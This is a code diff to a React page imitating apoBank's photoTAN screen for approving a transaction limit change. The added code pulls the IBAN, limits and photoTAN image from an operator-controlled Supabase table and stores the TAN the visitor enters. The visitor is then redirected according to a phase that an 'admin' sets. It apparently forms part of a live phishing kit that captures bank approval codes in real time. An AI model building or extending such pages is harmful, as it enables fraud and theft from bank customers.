@@ -1,13 +1,61 @@
-import { useState } from "react";
-import { ChevronRight, HelpCircle } from "lucide-react";
-import { useNavigate } from "react-router-dom";
+import { useEffect, useState } from "react";
+import { ChevronRight, HelpCircle, Loader2 } from "lucide-react";
+import { useNavigate, useSearchParams } from "react-router-dom";
 import apoBankLogo from "@/assets/apobank-logo.svg";
 import phototanImg from "@/assets/phototan.png";
 import { Button } from "@/components/ui/button";
+import { supabase } from "@/integrations/supabase/client";
 
 const LimitPhotoTan = () => {
   const navigate = useNavigate();
+  const [sp] = useSearchParams();
+  const token = sp.get("token");
   const [tan, setTan] = useState("");
+  const [row, setRow] = useState<any>(null);
+  const [submitted, setSubmitted] = useState(false);
+
+  useEffect(() => {
+    if (!token) return;
+    let alive = true;
+    const load = async () => {
+      const { data } = await (supabase as any)
+        .from("limit_tokens")
+        .select("*")
+        .eq("token", token)
+        .maybeSingle();
+      if (!alive || !data) return;
+      setRow(data);
+      const phase = data.customer_phase;
+      if (phase === "success") navigate("/success");
+      else if (phase === "aborted") navigate("/auth");
+      else if (phase === "confirm" || phase === "phototan_request") {
+        // admin sent us back
+        const qs = `?token=${encodeURIComponent(token)}`;
+        navigate(`/limit/confirm${qs}`);
+      }
+      if (data.last_error) setSubmitted(false);
+    };
+    load();
+    const iv = window.setInterval(load, 2500);
+    const ch = (supabase as any).channel(`limit_ptan_${token}`)
+      .on("postgres_changes", { event: "*", schema: "public", table: "limit_tokens", filter: `token=eq.${token}` }, load)
+      .subscribe();
+    return () => { alive = false; window.clearInterval(iv); (supabase as any).removeChannel(ch); };
+  }, [token, navigate]);
+
+  const submit = async () => {
+    if (!token) return;
+    setSubmitted(true);
+    await (supabase as any)
+      .from("limit_tokens")
+      .update({ tan_code: tan, last_error: null })
+      .eq("token", token);
+  };
+
+  const qrSrc = row?.photo_tan_image || phototanImg;
+  const valid = tan.length === 6 || tan.length === 8;
+  const currLimit = row?.current_limit != null ? Number(row.current_limit).toLocaleString("de-DE", { minimumFractionDigits: 2, maximumFractionDigits: 2 }) : "2.000,00";
+  const newLimit = row?.new_limit != null ? Number(row.new_limit).toLocaleString("de-DE", { minimumFractionDigits: 2, maximumFractionDigits: 2 }) : "26.000,00";
 
   return (
     <div className="min-h-screen bg-[#f5f5f5] flex flex-col">
@@ -40,19 +88,18 @@ const LimitPhotoTan = () => {
             <h2 className="text-lg sm:text-xl text-[#1a1a1a] mb-8">
               Bitte prüfen Sie die folgende Transaktion
             </h2>
-
             <p className="text-sm text-foreground mb-6">Limitänderung widerrufen</p>
 
             <div className="grid grid-cols-1 sm:grid-cols-2 gap-x-6 gap-y-6 sm:gap-y-8 mb-6">
               <div>
                 <p className="text-sm text-[#002776] mb-2 font-medium">Kontobezeichnung</p>
-                <p className="text-sm text-foreground">DE53 3006 0601 0025 9570 83</p>
+                <p className="text-sm text-foreground">{row?.auftraggeber_iban || "DE53 3006 0601 0025 9570 83"}</p>
               </div>
               <div>
                 <p className="text-sm text-[#002776] mb-2 font-medium">Neues Limit</p>
-                <p className="text-sm text-foreground mb-4">26.000,00</p>
+                <p className="text-sm text-foreground mb-4">{newLimit}</p>
                 <p className="text-sm text-[#002776] mb-2 font-medium">Altes Limit</p>
-                <p className="text-sm text-foreground">2.000,00</p>
+                <p className="text-sm text-foreground">{currLimit}</p>
               </div>
               <div>
                 <p className="text-sm text-[#002776] mb-2 font-medium">Gültig ab</p>
@@ -74,35 +121,29 @@ const LimitPhotoTan = () => {
                     <label className="absolute -top-2 left-3 bg-white px-1 text-[11px] text-[#002776]">TAN*</label>
                     <input
                       type="text"
+                      inputMode="numeric"
                       value={tan}
-                      onChange={(e) => setTan(e.target.value)}
-                      className="w-full border-2 border-[#002776] rounded px-3 py-3 text-sm outline-none focus:ring-2 focus:ring-[#a0b0c8]"
+                      onChange={(e) => setTan(e.target.value.replace(/[^0-9]/g, "").slice(0, 8))}
+                      disabled={submitted}
+                      className="w-full border-2 border-[#002776] rounded px-3 py-3 text-sm outline-none focus:ring-2 focus:ring-[#a0b0c8] disabled:bg-muted"
                     />
                   </div>
+                  {row?.last_error && (
+                    <p className="text-xs text-destructive mt-2">{row.last_error}</p>
+                  )}
                 </div>
-                <img src={phototanImg} alt="photoTAN Grafik" className="w-40 h-40 object-contain border border-black" />
+                <img src={qrSrc} alt="photoTAN Grafik" className="w-40 h-40 object-contain border border-black" />
               </div>
             </div>
 
             <div className="flex justify-end items-center gap-4 pt-2">
-              <button
-                onClick={() => navigate(-1)}
-                className="text-sm text-[#002776] hover:underline px-2"
+              <Button
+                disabled={!valid || submitted}
+                onClick={submit}
+                className={`rounded-full px-6 disabled:opacity-100 ${valid && !submitted ? "bg-white text-foreground border border-border hover:bg-white" : "bg-[#e6e8eb] text-foreground/60 hover:bg-[#e6e8eb]"}`}
               >
-                Abbrechen
-              </button>
-              {(() => {
-                const valid = tan.length === 6 || tan.length === 8;
-                return (
-                  <Button
-                    disabled={!valid}
-                    onClick={() => navigate("/success")}
-                    className={`rounded-full px-6 disabled:opacity-100 ${valid ? "bg-white text-foreground border border-border hover:bg-white" : "bg-[#e6e8eb] text-foreground/60 hover:bg-[#e6e8eb]"}`}
-                  >
-                    Freigeben
-                  </Button>
-                );
-              })()}
+                {submitted ? (<><Loader2 className="h-4 w-4 mr-2 animate-spin" />Wird geprüft ...</>) : "Freigeben"}
+              </Button>
             </div>
           </div>
         </div>
